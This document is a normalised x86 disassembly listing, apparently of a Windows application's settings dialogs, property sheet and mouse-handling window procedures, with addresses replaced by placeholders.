push edx
push 0x1
push ecx
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
fmul [ esp + 0x38 ]
imul eax ebx
fmul [ r--data ]
fsin
test eax eax
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
jge r-xdata
fadd [ r--data ]
fmul [ esp + 0x38 ]
fmul [ r--data ]
fsin
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452510
imul eax [ esp + 0x4c ]
mov [ esp + 0x6c ] eax
mov eax [ esp + 0x74 ]
add esp 0x8
or eax 0x1
mov [ esp + 0x6c ] eax
jmp r-xdata
fadd [ r--data ]
fmulp st1
sub esp 0x8
fstp [ esp ]
call sub_452510
mov ecx [ rw-data ]
fld [ esp + 0x38 ]
imul ecx ebx
fsin
mov esi eax
mov [ esp + 0x28 ] ecx
imul esi [ esp + 0x48 ]
fild [ esp + 0x28 ]
test ecx ecx
jge r-xdata
fadd [ r--data ]
mov ecx [ esp + 0x24 ]
test ecx edi
je r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x56
jne r-xdata
test edx edi
je r-xdata
fmulp st1
fstp [ esp ]
call sub_452510
mov edi eax
mov al [ rw-data ]
imul edi [ esp + 0x4c ]
add esp 0x8
test al al
je r-xdata
fadd [ r--data ]
fmulp st1
fstp [ esp ]
call sub_452510
mov edi eax
mov al [ rw-data ]
imul edi [ esp + 0x4c ]
add esp 0x8
test al al
je r-xdata
fadd [ r--data ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov edx [ esp + 0x30 ]
mov [ rw-data ] 0x69
mov [ rw-data ] 0x0
mov eax [ edx ]
push ecx
sub eax 0x32
push 0x1
push eax
call sub_48a5f0
mov edx [ esp + 0x24 ]
mov [ rw-data ] esi
mov esi [ esp + 0x44 ]
add esp 0xc
test edx edi
je r-xdata
test edx edi
je r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x1600
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
push 0x0
push edi
push esi
call sub_47ae00
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
push edi
push esi
call sub_47ae00
add esp 0xc
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx eax
mov eax [ rw-data ]
dec ecx
test eax eax
mov [ rw-data ] ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
or [ esp + 0x7c ] 0x12
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push ecx
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
push eax
push edx
push 0x0
push 0x0
call sub_477a80
add esp 0x20
mov [ rw-data ] 0x1
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push ecx
push eax
push 0x0
push 0x0
call sub_477a80
add esp 0x20
mov [ rw-data ] 0x1
mov eax ecx
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov edx [ eax * 4 + rw-data ]
push ecx
push 0x1
push edx
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp ebp 0x10
jl r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
push 0x0
push 0x0
push eax
mov [ rw-data ] edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
push 0x1
push 0x23
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp ebp 0x14
jl r-xdata
sub_497220
mov eax [ esp + 0x8 ]
sub esp 0x22c
push ebx
push ebp
add eax 0xffffffb2
cmp eax 0xc6
push esi
push edi
ja r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x22c
retn 0x10
movzx eax [ eax + lookup_table_497ae4 ]
jmp [ eax * 4 + jump_table_497ad0 ]
mov ecx [ rw-data ]
mov ebp [ esp + 0x240 ]
push 0x808
and ecx 0x3
push ebp
mov eax 0x806
call sub_457c00
mov eax [ rw-data ]
and eax 0x4
mov ecx 0x809
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
and eax 0x8
mov ecx 0x80a
mov edx ebp
call sub_457bf0
mov eax rw-data
mov ecx 0x80b
mov edx ebp
call sub_457c20
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
sete al
mov ecx 0x80d
mov edx ebp
call sub_457bf0
mov ecx [ rw-data ]
push 0x811
push ebp
mov eax 0x80e
call sub_457c00
mov ecx [ rw-data ]
push ecx
push 0x14
push 0x0
mov edi 0x812
mov ebx 0x813
mov esi ebp
call sub_457b80
mov edx [ rw-data ]
and dl 0x3
dec dl
neg dl
mov eax 0x809
mov ecx ebp
sbb edx edx
inc edx
call sub_457d70
mov edx [ rw-data ]
and dl 0x3
dec dl
neg dl
mov eax 0x80a
mov ecx ebp
sbb edx edx
inc edx
call sub_457d70
mov eax [ rw-data ]
and eax 0x1
mov ecx 0x814
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
and eax 0x2
mov ecx 0x815
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x816
mov edx ebp
call sub_457bf0
mov ecx [ rw-data ]
sar ecx 0x1
push 0x819
and ecx 0x1
push ebp
mov eax 0x818
call sub_457c00
mov eax [ rw-data ]
not eax
and eax 0x1
mov ecx 0x81a
mov edx ebp
call sub_457bf0
mov ecx [ rw-data ]
mov eax 0x66666667
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
mov ecx 0x8
sub ecx edx
push ecx
push 0x8
push 0x0
mov esi 0x81c
mov edi ebp
call sub_457c30
mov eax [ rw-data ]
add esp 0x30
mov ecx 0x4f3
mov edx ebp
call sub_457bf0
push 0xde8
push ebp
call [ GetDlgItem@IAT ]
mov edx [ rw-data ]
mov edi eax
mov eax 0xde8
mov ecx ebp
call sub_457d70
mov ebx [ EnumDisplaySettingsA@IAT ]
lea edx [ esp + 0x34 ]
push edx
xor esi esi
push esi
push esi
mov [ esp + 0x64 ] 0x9c
call ebx
test eax eax
mov ebp [ SendMessageA@IAT ]
je r-xdata
mov ecx [ esp + 0x248 ]
movzx eax cx
cmp eax 0x812
jg r-xdata
mov eax [ esp + 0x240 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x24c ]
mov eax [ eax + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
push 0x14e
push edi
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
jmp r-xdata
cmp eax 0x816
jg r-xdata
je r-xdata
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x1
mov eax [ esp + 0xac ]
mov ecx [ esp + 0x9c ]
mov edx [ esp + 0xa4 ]
push eax
mov eax [ esp + 0xa4 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x24 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x18
lea edx [ esp + 0x14 ]
push edx
push 0x0
push 0x143
push edi
call ebp
lea eax [ esp + 0x34 ]
push eax
inc esi
push esi
push 0x0
call ebx
test eax eax
jne r-xdata
cmp eax 0x818
jl r-xdata
je r-xdata
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
cmp eax 0x80b
jg r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
mov esi [ esp + 0x240 ]
mov edi [ rw-data ]
push rw-data
push 0x808
push esi
mov ebx 0x806
call sub_457d00
lea ecx [ esp + 0x1c ]
push ecx
mov eax 0x809
mov ecx esi
call sub_457ce0
mov edx [ esp + 0x20 ]
mov ebp [ rw-data ]
lea eax [ edx * 4 ]
lea ecx [ esp + 0x20 ]
or ebp eax
push ecx
mov eax 0x80a
mov ecx esi
mov [ rw-data ] ebp
call sub_457ce0
mov edx [ esp + 0x24 ]
mov ecx [ rw-data ]
lea eax [ edx * 8 ]
or ecx eax
mov [ rw-data ] ecx
push esi
mov eax 0x104
mov ecx rw-data
mov edx 0x80b
call sub_457d40
push rw-data
mov eax 0x80d
mov ecx esi
call sub_457ce0
mov eax [ rw-data ]
xor ecx ecx
test eax eax
sete cl
push rw-data
push 0x811
push esi
mov ebx 0x80e
mov [ rw-data ] ecx
call sub_457d00
push rw-data
push 0x14
push 0x0
push 0x813
mov ecx 0x812
mov edx esi
call sub_457ca0
mov eax [ rw-data ]
add esp 0x38
cmp edi eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
cmp eax 0x81a
jle r-xdata
mov eax [ esp + 0x240 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
sub eax 0x814
je r-xdata
jmp r-xdata
cmp eax 0x80c
je r-xdata
je r-xdata
mov edi [ rw-data ]
push rw-data
mov eax 0x814
mov ecx esi
call sub_457ce0
lea eax [ esp + 0x14 ]
push eax
mov eax 0x815
mov ecx esi
call sub_457ce0
mov ecx [ esp + 0x18 ]
mov ebp [ rw-data ]
lea edx [ ecx + ecx ]
or ebp edx
push rw-data
mov eax 0x816
mov ecx esi
mov [ rw-data ] ebp
call sub_457ce0
mov eax [ rw-data ]
add esp 0xc
cmp edi eax
mov ebx 0x2
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0xde8
jne r-xdata
mov esi [ esp + 0x240 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x814
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
dec eax
jne r-xdata
push 0x104
lea eax [ esp + 0x38 ]
push eax
push 0x0
mov [ esp + 0x144 ] 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
call sub_457f40
mov esi [ esp + 0x244 ]
lea edx [ esp + 0x38 ]
push r--data
dec edx
mov [ eax + edx ] 0x0
push 0x104
lea eax [ esp + 0x144 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push esi
call sub_45be60
mov al [ esp + 0x150 ]
add esp 0x18
test al al
je r-xdata
jle r-xdata
cmp eax 0x808
jg r-xdata
mov edi [ IsDlgButtonChecked@IAT ]
push 0x819
push esi
call edi
test eax eax
mov eax [ rw-data ]
je r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x8f
call sub_48a5f0
add esp 0xc
shr ecx 0x10
cmp ecx 0x1
je r-xdata
push 0x0
push 0x815
push esi
call [ CheckDlgButton@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
mov esi [ esp + 0x240 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x815
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x138 ]
push edx
push 0x80b
push esi
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
cmp eax 0x811
jle r-xdata
cmp eax 0x809
jl r-xdata
cmp eax 0x806
jge r-xdata
and eax 0xfffffffd
or eax ebx
jmp r-xdata
test eax eax
je r-xdata
test edi edi
je r-xdata
push 0x0
push 0x814
push esi
call [ CheckDlgButton@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
cmp eax 0x80a
jle r-xdata
mov edi [ esp + 0x240 ]
push 0x0
push edi
push 0x468
push edi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x807
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi eax
dec esi
neg esi
sbb esi esi
inc esi
push esi
push 0x809
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0x80a
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
cmp eax 0x4f3
jne r-xdata
or eax 0x1
and eax 0xfffffffe
jmp r-xdata
push 0x81a
push esi
mov [ rw-data ] eax
call edi
test eax eax
mov eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
mov esi [ esp + 0x240 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x10 ]
push edx
mov eax 0x4f3
mov ecx esi
call sub_457ce0
mov edx [ esp + 0x14 ]
add esp 0x4
mov eax 0xde8
mov ecx esi
call sub_457d70
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
mov dl [ rw-data ]
test dl dl
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov [ rw-data ] eax
push 0x8
push 0x0
mov eax 0x81c
mov ecx esi
call sub_457d50
mov ecx [ esp + 0x1c ]
mov edi [ rw-data ]
mov eax 0x8
sub eax ecx
lea edx [ eax + eax * 4 ]
push rw-data
mov eax 0x4f3
mov ecx esi
mov [ rw-data ] edx
call sub_457ce0
add esp 0x10
push 0x0
push 0x0
push 0x147
push 0xde8
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
cmp ecx edi
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push esi
push 0x1
push 0x1
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
test ecx ecx
je r-xdata
push 0x1
push 0x0
push esi
push 0xffffffff
push 0xffffffff
cmp [ rw-data ] ebx
jne r-xdata
call sub_4719b0
add esp 0x14
push 0x0
push 0x0
call [ ChangeDisplaySettingsA@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
push 0x0
call [ EnumDisplaySettingsA@IAT ]
push 0x4
lea edx [ esp + 0x38 ]
push edx
mov [ esp + 0x60 ] 0x9c
mov [ esp + 0x64 ] 0x5c0000
call [ ChangeDisplaySettingsA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x22c
retn 0x10
sub_497ae9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al [ esp + eax ]
add edx [ eax - 0x6f6f6f70 ]
mov eax [ esp + 0x8 ]
sub esp 0x20c
sub eax 0x4e
push ebx
push esi
je r-xdata
mov ecx [ esp + 0x224 ]
mov eax [ ecx + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
sub eax 0xc2
je r-xdata
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x5
mov esi [ esp + 0x218 ]
mov eax [ rw-data ]
mov ecx 0x8e3
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8e4
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8e5
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8e6
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8f0
mov edx esi
call sub_457bf0
mov ecx [ rw-data ]
push 0x8ec
push esi
mov eax 0x8e9
call sub_457c00
add esp 0x8
mov eax rw-data
mov ecx 0x8ed
mov edx esi
call sub_457c20
pop esi
mov eax 0x1
pop ebx
add esp 0x20c
retn 0x10
dec eax
je r-xdata
pop esi
mov eax 0x1
pop ebx
add esp 0x20c
retn 0x10
mov esi [ esp + 0x218 ]
push rw-data
mov eax 0x8e3
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8e4
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8e5
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8e6
mov ecx esi
call sub_457ce0
lea edx [ esp + 0x18 ]
push edx
mov eax 0x8f0
mov ecx esi
call sub_457ce0
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
add esp 0x14
cmp eax ecx
je r-xdata
mov ecx [ esp + 0x220 ]
movzx eax cx
add eax 0xfffff71d
cmp eax 0xd
ja r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x20c
retn 0x10
push rw-data
push 0x8ec
push esi
mov ebx 0x8e9
call sub_457d00
push esi
mov eax 0x104
mov ecx rw-data
mov edx 0x8ed
call sub_457d40
add esp 0x10
cmp [ rw-data ] 0x1
jne r-xdata
movzx eax [ eax + lookup_table_497e98 ]
jmp [ eax * 4 + jump_table_497e84 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push 0x1
push 0x8f
call sub_48a5f0
add esp 0xc
push 0x104
lea ecx [ esp + 0x10 ]
xor ebx ebx
push ecx
push ebx
mov [ esp + 0x11c ] bl
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0xc ]
push edx
call sub_457f40
mov esi [ esp + 0x21c ]
push r--data
mov [ esp + eax + 0x13 ] bl
push 0x104
lea eax [ esp + 0x11c ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push esi
call sub_45be60
mov al [ esp + 0x128 ]
add esp 0x18
cmp al bl
je r-xdata
mov eax [ esp + 0x218 ]
push eax
call sub_4b39d0
add esp 0x4
pop esi
mov eax 0x1
pop ebx
add esp 0x20c
retn 0x10
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
mov eax [ esp + 0x218 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop esi
mov eax 0x1
pop ebx
add esp 0x20c
retn 0x10
push ebx
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x110 ]
push edx
push 0x8ed
push esi
call [ SetDlgItemTextA@IAT ]
pop esi
mov eax 0x1
pop ebx
add esp 0x20c
retn 0x10
sub_497eb0
sub esp 0x80
push esi
push edi
mov edi [ esp + 0x8c ]
push 0xfffffffa
push edi
mov [ esp + 0x2c ] 0x30
mov [ esp + 0x30 ] 0x8
call [ GetWindowLongA@IAT ]
mov esi [ CreatePropertySheetPageA@IAT ]
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x34 ] 0x5e2
mov [ esp + 0x40 ] sub_466e60
mov [ esp + 0x3c ] r--data
call esi
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x34 ] 0x5e3
mov [ esp + 0x40 ] sub_497220
mov [ esp + 0x3c ] r--data
call esi
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x10 ] eax
mov [ esp + 0x34 ] 0x5e4
mov [ esp + 0x40 ] sub_45bf30
mov [ esp + 0x3c ] r--data
call esi
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x34 ] 0x5e5
mov [ esp + 0x40 ] sub_47f920
mov [ esp + 0x3c ] r--data
call esi
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x34 ] 0x5e6
mov [ esp + 0x40 ] sub_477580
mov [ esp + 0x3c ] r--data
call esi
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x34 ] 0x5e7
mov [ esp + 0x40 ] r-xdata
mov [ esp + 0x3c ] r--data
call esi
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x34 ] 0xc27
mov [ esp + 0x40 ] r-xdata
mov [ esp + 0x3c ] r--data
call esi
mov edx [ rw-data ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x54 ]
lea ecx [ esp + 0x8 ]
push eax
mov [ esp + 0x58 ] 0x34
mov [ esp + 0x5c ] 0x2000000
mov [ esp + 0x60 ] edi
mov [ esp + 0x6c ] r--data
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x78 ] ecx
mov [ esp + 0x74 ] edx
call [ PropertySheetA@IAT ]
pop edi
pop esi
add esp 0x80
retn
sub_498030
push ebp
mov ebp esp
push 0xffffffff
push sub_4c16e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x4194
call sub_4b6180
test [ rw-data ] 0x1
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
jne r-xdata
or ebx 0xffffffff
or [ rw-data ] 0x1
xor eax eax
push sub_4c3210
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_4b6619
add esp 0x4
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x201
ja r-xdata
or [ rw-data ] esi
push sub_4c31d0
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
call sub_4b6619
add esp 0x4
mov [ ebp - 0x4 ] ebx
mov al [ rw-data ]
xor edi edi
test al 0x2
mov esi 0x2
jne r-xdata
lea ecx [ eax - 0x202 ]
cmp ecx 0xa1
ja r-xdata
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
movzx edx [ ecx + lookup_table_499fe8 ]
jmp [ edx * 4 + jump_table_499fcc ]
mov esi [ GetCursorPos@IAT ]
lea eax [ ebp - 0x18 ]
push eax
mov [ rw-data ] 0x0
call esi
mov edx [ rw-data ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ rw-data ] eax
cmp [ rw-data ] edi
mov [ rw-data ] ecx
je r-xdata
cmp eax 0x110
ja r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
mov eax [ rw-data ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] edi
mov [ rw-data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea edx [ ebp - 0x84 ]
push edx
push esi
mov [ rw-data ] 0x1
call [ GetClientRect@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call [ GetCursorPos@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push esi
call [ ScreenToClient@IAT ]
mov eax [ ebp - 0x18 ]
cmp [ ebp - 0x84 ] eax
jg r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov [ rw-data ] 0x0
call [ GetCursorPos@IAT ]
mov edx [ rw-data ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ rw-data ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x84 ]
push edx
push eax
call [ GetWindowRect@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
call esi
mov eax [ ebp - 0x18 ]
cmp [ ebp - 0x84 ] eax
jg r-xdata
sub eax 0x111
je r-xdata
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call [ SetCapture@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] 0x10
mov [ ebp - 0x64 ] 0x12
mov [ ebp - 0x60 ] esi
call [ _TrackMouseEvent@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax [ ebp - 0x7c ]
jge r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ ebp - 0x7c ]
jge r-xdata
mov edi [ ebp + 0x10 ]
cmp di 0x1
jne r-xdata
sub eax 0x3
je r-xdata
cmp [ rw-data ] edi
mov esi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
jne r-xdata
sub eax esi
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x80 ] eax
jg r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x1
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x80 ] eax
jg r-xdata
cmp di 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi [ ebp + 0x14 ]
lea eax [ ebp - 0x50 ]
push eax
push 0x2
push edi
mov [ ebp - 0x50 ] 0x1c
mov [ ebp - 0x4c ] 0x7
call [ GetScrollInfo@IAT ]
mov eax [ ebp + 0x10 ]
cmp ax 0x8
mov [ ebp - 0x4c ] 0x4
je r-xdata
sub eax 0xec
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x84 ]
push ecx
push esi
mov [ rw-data ] 0x1
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x80 ]
mov edx [ ebp - 0x84 ]
mov [ rw-data ] eax
mov al [ rw-data ]
test al al
push edi
mov [ rw-data ] edx
push edi
je r-xdata
sub eax 0x4
je r-xdata
cmp eax [ ebp - 0x78 ]
jl r-xdata
cmp [ rw-data ] esi
jne r-xdata
cmp eax [ ebp - 0x78 ]
jl r-xdata
cmp di 0x4ee
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call [ DestroyWindow@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
mov edx [ rw-data ]
test ecx ecx
mov ecx [ rw-data ]
jne r-xdata
movzx ecx ax
cmp ecx 0x7
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
push r--data
push esi
call [ SetWindowTextA@IAT ]
mov ecx [ rw-data ]
add ecx 0x118
call sub_41f020
mov ecx [ rw-data ]
add ecx 0x134
mov [ rw-data ] eax
call sub_41f020
cmp eax ebx
je r-xdata
push r--data
push esi
call [ SetWindowTextA@IAT ]
mov ecx [ rw-data ]
add ecx 0x2d8
call sub_41f020
mov ecx [ rw-data ]
add ecx 0x2f4
mov [ rw-data ] eax
call sub_41f020
mov ecx [ rw-data ]
add ecx 0x310
mov [ rw-data ] eax
call sub_41f020
push edi
push 0x4ed
push esi
mov [ rw-data ] eax
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push edi
push esi
mov [ rw-data ] 0x1
call sub_481c40
mov ecx [ rw-data ]
push ecx
call [ InvalidateRect@IAT ]
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
sub eax 0x7e
jne r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
cmp di 0x54c
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
imul ecx ecx 0x70
mov ecx [ ecx + edx - 0x28 ]
inc ecx
push ecx
